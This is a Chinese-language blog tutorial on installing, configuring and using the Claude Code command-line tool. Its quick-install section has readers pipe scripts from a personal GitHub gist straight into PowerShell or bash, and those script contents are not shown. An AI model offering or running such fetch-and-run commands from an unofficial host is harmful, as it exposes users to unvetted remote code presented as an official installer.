---
title: "Claude Code 完全指南：从安装到精通"
description: "详细介绍如何在 Windows、Linux 和 macOS 上安装和使用 Claude Code CLI"
tags: [claude, ai, tutorial, cli, tools]
date: "2026-03-28"
readingTime: 15
featured: true
cover: /images/unsplash/blog-claude-code-guide.jpg
credit: Photo by Radowan Nakif Rehan on Unsplash
creditUrl: https://unsplash.com/@radowanrehan?utm_source=turing&utm_medium=referral
---

Claude Code 是 Anthropic 官方推出的命令行 AI 编程助手。它不仅能聊天，更能直接操作你的代码库——读写文件、执行命令、管理 Git，真正成为你的编程伙伴。

本文从安装、配置到日常使用与进阶技巧，带你完整走一遍。

## 它能做什么

- 直接读写文件系统
- 执行 Shell 命令
- 理解项目结构与上下文
- 深度集成 Git 工作流
- 支持所有主流编程语言
- 自动定位并修复 Bug

## 快速安装

选择你的操作系统，一条命令完成安装：

::platform-tabs
---
platforms:
  - id: windows
    name: Windows
    shell: PowerShell
    command: "irm https://gist.githubusercontent.com/LJMcarryu/e06aa5d0875362133fb5eb3aa7649f50/raw/install-claude.ps1 | iex"
  - id: linux
    name: Linux
    shell: Bash
    command: "curl -fsSL https://gist.githubusercontent.com/LJMcarryu/c29ac66bb58b5cc59390277ad7ecec06/raw/install-claude.sh | bash"
  - id: macos
    name: macOS
    shell: Terminal
    command: "curl -fsSL https://gist.githubusercontent.com/LJMcarryu/c29ac66bb58b5cc59390277ad7ecec06/raw/install-claude.sh | bash"
---
::

也可以通过包管理器手动安装：

```bash
npm install -g @anthropic-ai/claude-code
# 或
pnpm add -g @anthropic-ai/claude-code
```

## 初始配置

::step-list
---
steps:
  - title: 获取 API Key
    desc: 访问 console.anthropic.com 注册并创建密钥。
  - title: 配置密钥
    code: claude config set apiKey YOUR_API_KEY_HERE
  - title: 验证安装
    code: claude --version
---
::

### 选择模型

::card-grid
---
items:
  - title: Opus 4.6
    meta: 最强大
    desc: 复杂架构与大规模重构
    points: [复杂架构设计, 大规模重构, 深度代码分析]
  - title: Sonnet 4.6
    meta: 均衡
    desc: 性能与速度兼顾
    points: [日常开发任务, Bug 修复, 代码审查]
  - title: Haiku 4.5
    meta: 极速
    desc: 快速响应的轻量任务
    points: [快速查询, 简单修改, 代码解释]
---
::

### 权限模式

- **Prompt 模式（推荐）**：每次操作前询问确认。
- **Auto 模式（谨慎）**：自动执行所有操作。
- **Readonly 模式**：只读，不修改任何文件。

## 基本使用

直接用自然语言描述需求，Claude Code 会读写文件、执行命令并反馈结果：

```text
> 创建一个 React 组件 UserProfile，包含头像、姓名和简介
✓ Created src/components/UserProfile.tsx
✓ Added TypeScript interfaces
✓ Included responsive styling
```

常用内置斜杠命令：

::card-grid
---
items:
  - title: /commit
    desc: 生成提交
  - title: /review-pr
    desc: 审查 PR
  - title: /fast
    desc: 快速模式
  - title: /model
    desc: 切换模型
  - title: /memory
    desc: 记忆管理
  - title: /clear
    desc: 清空上下文
---
::

## 进阶功能

**多文件编辑**：一次性重构整个项目并保持一致性。**Git 工作流集成**：从建分支到提交一气呵成。**智能代码搜索**：语义检索，不只是文本匹配。

```text
> 创建新分支 feature/dark-mode 并实现暗色主题
✓ Created branch feature/dark-mode
✓ Updated 12 components
✓ Committed: "feat: add dark mode support"
```

## 最佳实践

- **具体明确**：说清楚文件名和功能。
- **提供上下文**：交代背景与预期结果。
- **分步执行**：复杂任务拆成小步骤。
- 用 `.claudeignore` 排除敏感文件，提交前检查 `git diff`，生产环境用 readonly 模式，API Key 不要提交到代码库。

## 常见问题

::faq-list
---
items:
  - q: Claude Code 会修改我的文件吗？
    a: 默认 prompt 模式会在修改前询问确认。你可以随时用 git diff 查看更改，或 git restore 撤销。
  - q: API 调用会产生费用吗？
    a: 是的，按 token 计费。可以用 claude usage 查看使用量。推荐日常任务使用 Sonnet 模型以节省成本。
  - q: 支持哪些编程语言？
    a: 支持所有主流语言：JavaScript/TypeScript、Python、Go、Rust、Java、C/C++、Ruby、PHP、Swift、Kotlin 等。
  - q: 如何更新到最新版本？
    a: 运行 npm update -g @anthropic-ai/claude-code 或重新运行安装脚本即可。
---
::

---

延伸阅读：[官方文档](https://docs.anthropic.com/claude/docs/claude-code) · [GitHub](https://github.com/anthropics/claude-code)
